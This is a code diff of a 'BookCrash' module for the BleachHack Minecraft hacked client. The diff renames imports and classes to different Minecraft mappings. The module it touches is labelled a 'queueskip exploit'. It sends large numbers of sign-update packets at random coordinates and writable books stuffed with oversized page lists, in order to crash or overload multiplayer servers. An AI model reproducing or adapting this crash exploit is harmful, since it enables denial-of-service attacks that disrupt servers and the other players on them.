@@ -23,17 +23,17 @@ import org.bleachhack.setting.module.SettingToggle;
 
 import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
 import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
-import net.minecraft.item.ItemStack;
-import net.minecraft.item.Items;
-import net.minecraft.nbt.NbtCompound;
-import net.minecraft.nbt.NbtList;
-import net.minecraft.nbt.NbtString;
-import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
-import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
-import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
-import net.minecraft.network.packet.s2c.common.DisconnectS2CPacket;
-import net.minecraft.screen.slot.SlotActionType;
-import net.minecraft.util.math.BlockPos;
+import net.minecraft.world.item.ItemStack;
+import net.minecraft.world.item.Items;
+import net.minecraft.nbt.CompoundTag;
+import net.minecraft.nbt.ListTag;
+import net.minecraft.nbt.StringTag;
+import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
+import net.minecraft.network.protocol.game.ServerboundSetCreativeModeSlotPacket;
+import net.minecraft.network.protocol.game.ServerboundSignUpdatePacket;
+import net.minecraft.network.protocol.common.ClientboundDisconnectPacket;
+import net.minecraft.world.inventory.ClickType;
+import net.minecraft.core.BlockPos;
 
 /* Rebranded queueskip exploit. credit > https://www.youtube.com/watch?v=-BA4ABlFJuc */
 public class BookCrash extends Module {
@@ -57,8 +57,8 @@ public class BookCrash extends Module {
 			return;
 
 		ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
-		NbtList list = new NbtList();
-		NbtCompound tag = new NbtCompound();
+		ListTag list = new ListTag();
+		CompoundTag tag = new CompoundTag();
 		String author = "Bleach";
 		String title = "\n Bleachhack Owns All \n";
 
@@ -82,12 +82,12 @@ public class BookCrash extends Module {
 			String text = "bh ontop";
 			Random rand = new Random();
 			for (int i = 0; i < getSetting(1).asSlider().getValue(); i++) {
-				mc.player.networkHandler.sendPacket(new UpdateSignC2SPacket(
+				mc.player.networkHandler.sendPacket(new ServerboundSignUpdatePacket(
 						new BlockPos(rand.nextInt(29999999), rand.nextInt(29999999), rand.nextInt(29999999)),true, text, text, text, text));
 			}
 		} else {
 			for (int i = 0; i < pages; i++) {
-				NbtString tString = NbtString.of(size);
+				StringTag tString = StringTag.of(size);
 				list.add(tString);
 			}
 
@@ -103,9 +103,9 @@ public class BookCrash extends Module {
 					Int2ObjectMap<ItemStack> map = new Int2ObjectOpenHashMap<>(1);
 					map.put(0, bookObj);
 
-					mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(0, 0, 0, 0, SlotActionType.PICKUP, bookObj, map));
+					mc.player.networkHandler.sendPacket(new ServerboundContainerClickPacket(0, 0, 0, 0, ClickType.PICKUP, bookObj, map));
 				} else {
-					mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(0, bookObj));
+					mc.player.networkHandler.sendPacket(new ServerboundSetCreativeModeSlotPacket(0, bookObj));
 				}
 			}
 		}
@@ -113,7 +113,7 @@ public class BookCrash extends Module {
 
 	@BleachSubscribe
 	public void EventDisconnect(EventPacket.Read event) {
-		if (event.getPacket() instanceof DisconnectS2CPacket && getSetting(5).asToggle().getState())
+		if (event.getPacket() instanceof ClientboundDisconnectPacket && getSetting(5).asToggle().getState())
 			setEnabled(false);
 	}
 
